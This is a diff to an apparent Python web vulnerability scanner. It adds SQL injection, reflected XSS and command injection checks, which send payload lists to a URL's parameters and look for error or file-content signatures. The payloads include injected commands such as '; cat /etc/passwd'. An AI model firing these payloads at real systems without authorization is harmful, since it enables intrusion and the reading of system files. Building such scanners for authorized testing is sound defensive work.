@@ -1,44 +1,102 @@
-# scanner/vulns.py
-
 import requests
 
+# -------------------------------
+# SQL Injection
+# -------------------------------
 SQLI_PAYLOADS = [
     "' OR '1'='1",
     "\" OR \"1\"=\"1",
     "'; --",
-    "' OR 1=1 --"
+    "' OR 1=1 --",
+]
+SQLI_ERROR_SIGNATURES = [
+    "SQL syntax", "mysql_fetch", "syntax error",
+    "Warning: mysql", "Unclosed quotation mark",
+    "You have an error in your SQL syntax;"
 ]
 
+def check_sqli(url, params, method='get', session=None):
+    if session is None:
+        session = requests
+
+    found_sqli = False
+    for payload in SQLI_PAYLOADS:
+        test_params = {k: payload for k in params}
+        if method == 'post':
+            r = session.post(url, data=test_params)
+        else:
+            r = session.get(url, params=test_params)
+
+        # Check for known SQL error messages
+        for sig in SQLI_ERROR_SIGNATURES:
+            if sig.lower() in r.text.lower():
+                print(f"[!] Possible SQL Injection at {url} with payload '{payload}'")
+                found_sqli = True
+                break
+        if found_sqli:
+            break
+    return found_sqli
+
+# -------------------------------
+# Cross-Site Scripting (XSS)
+# -------------------------------
 XSS_PAYLOAD = "<script>alert('XSS')</script>"
 
-def check_sqli(url, params, method='get'):
-    """Inject known SQLi payloads and look for error strings."""
-    error_signatures = ["SQL syntax", "mysql_fetch", "syntax error"]
-    for payload in SQLI_PAYLOADS:
-        # Create a copy of params with the payload
-        test_params = {k: payload for k in params.keys()}
-        if method == 'post':
-            response = requests.post(url, data=test_params)
-        else:
-            response = requests.get(url, params=test_params)
+def check_xss(url, params, method='get', session=None):
+    if session is None:
+        session = requests
 
-        # Check response for known SQL error signatures
-        for error_sig in error_signatures:
-            if error_sig.lower() in response.text.lower():
-                print(f"[!] Possible SQL Injection at {url} with payload {payload}")
-                return True
-    return False
+    test_params = {k: XSS_PAYLOAD for k in params}
 
-def check_xss(url, params, method='get'):
-    """Inject an XSS payload and see if it appears in the response."""
-    test_params = {k: XSS_PAYLOAD for k in params.keys()}
     if method == 'post':
-        response = requests.post(url, data=test_params)
+        r = session.post(url, data=test_params)
     else:
-        response = requests.get(url, params=test_params)
+        r = session.get(url, params=test_params)
 
-    if XSS_PAYLOAD in response.text:
-        print(f"[!] Possible XSS at {url} with payload {XSS_PAYLOAD}")
+    # If we see our exact payload in the response, it's likely a reflection
+    if XSS_PAYLOAD in r.text:
+        print(f"[!] Possible XSS at {url} with payload '{XSS_PAYLOAD}'")
         return True
-
     return False
+
+# -------------------------------
+# Command Injection
+# -------------------------------
+CMD_INJECTION_PAYLOADS = [
+    "; ls",
+    "&& ls",
+    "| ls",
+    "; cat /etc/passwd",
+    "&& cat /etc/passwd",
+]
+
+CMD_INJECTION_SIGNATURES = [
+    "root:x:0:0",      # typical in /etc/passwd
+    "daemon:",         # also in /etc/passwd
+    "bin/bash",
+    "Windows IP Configuration",  # if we tried windows commands
+]
+
+def check_cmd_injection(url, params, method='get', session=None):
+    if session is None:
+        session = requests
+
+    found_cmd = False
+
+    for payload in CMD_INJECTION_PAYLOADS:
+        test_params = {k: payload for k in params}
+
+        if method == 'post':
+            resp = session.post(url, data=test_params)
+        else:
+            resp = session.get(url, params=test_params)
+
+        for sig in CMD_INJECTION_SIGNATURES:
+            if sig.lower() in resp.text.lower():
+                print(f"[!] Possible Command Injection at {url} with payload '{payload}'")
+                found_cmd = True
+                break
+        if found_cmd:
+            break
+
+    return found_cmd
